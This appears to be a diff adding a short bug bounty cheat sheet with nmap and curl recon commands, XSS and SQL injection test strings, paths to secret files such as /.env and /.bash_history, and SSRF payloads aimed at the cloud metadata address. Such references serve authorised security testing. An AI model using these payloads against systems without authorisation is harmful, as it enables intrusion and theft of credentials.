@@ -1,0 +1,26 @@
+# Bug Bounty Cheat Sheet & Methodology
+
+## Recon Chains
+1. Port Scan: `nmap -sV -T4 <target>`
+2. Banner Grabbing: `curl -I <url>`
+3. Tech Fingerprinting: Look for X-Powered-By, Server headers, and cookie names (PHPSESSID, JSESSIONID).
+
+## Web Vulnerabilities
+### Cross-Site Scripting (XSS)
+- Patterns: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`
+- Test: Parameters like `q=`, `search=`, `id=`, `name=`.
+
+### SQL Injection (SQLi)
+- Patterns: `' OR 1=1--`, `admin' --`, `' UNION SELECT NULL,NULL--`
+- Indicators: Database errors in response, timing delays (sleep).
+
+### Information Disclosure
+- Files: `/.git/config`, `/.env`, `/.phpinfo.php`, `/robots.txt`, `/sitemap.xml`, `/.bash_history`
+- Backups: `config.php.bak`, `index.php.old`.
+
+### SSRF (Server-Side Request Forgery)
+- Patterns: `url=http://169.254.169.254/latest/meta-data/`, `dest=http://localhost:22`
+
+## Tools in Infurnex
+- `nmap`, `curl`, `grep`, `awk`, `strings`, `xxd`.
+- Use pipes! Example: `curl -s <url> | grep "API_KEY"`
